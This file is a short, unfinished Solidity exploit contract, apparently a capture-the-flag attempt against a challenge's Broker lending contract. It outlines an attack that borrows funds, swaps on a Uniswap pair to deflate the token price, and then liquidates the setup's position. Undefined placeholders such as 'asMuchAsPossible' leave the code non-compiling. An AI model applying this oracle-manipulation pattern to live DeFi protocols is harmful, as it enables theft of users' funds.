pragma solidity "0.8.0";

import "../public/Setup.sol";

contract Exploit {
    Setup setup;
    Broker broker;
    IUniswapV2Pair pair;
    constructor(Setup _setup) payable {
        setup = _setup;
        pair = _setup.pair();
        broker = _setup.broker();
        
        broker.deposit(many);
        broker.borrow(asMuchAsPossible);

        pair.swap(_setup.token);    // deflate the price of token
        broker.liquidate(address(setup), asMuchAsPossible);
        // broker.deposit(asMuchToCompensateDebt);
    }

    function getRate() public view returns (uint) {
        return setup.broker().rate();
    }

    function getTokenAddress() public view returns (address) {
        return address(setup.token());
    }
}